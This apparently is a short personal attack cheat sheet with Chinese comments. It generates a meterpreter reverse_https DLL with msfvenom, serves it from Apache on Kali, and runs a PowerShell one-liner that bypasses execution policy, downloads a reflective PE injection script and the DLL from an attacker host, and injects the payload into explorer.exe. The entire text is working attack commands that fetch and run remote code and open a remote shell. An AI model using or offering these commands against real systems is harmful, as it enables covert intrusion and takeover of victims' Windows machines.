# 1. 启动 Kali Apache Web 服务器 : sudo service apache2 start
# 2. 生成恶意 DLL, 并保存到 Web 根目录 : sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 -f dll -o /var/www/html/met.dll

PowerShell -Exec Bypass -c "IEX((New-Object System.Net.WebClient).DownloadString('http://My-Kali-IP/Invoke-ReflectivePEInjection.ps1')) | Import-Module; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://My-Kali-IP/met.dll') -ProcId (Get-Process -Name explorer).Id"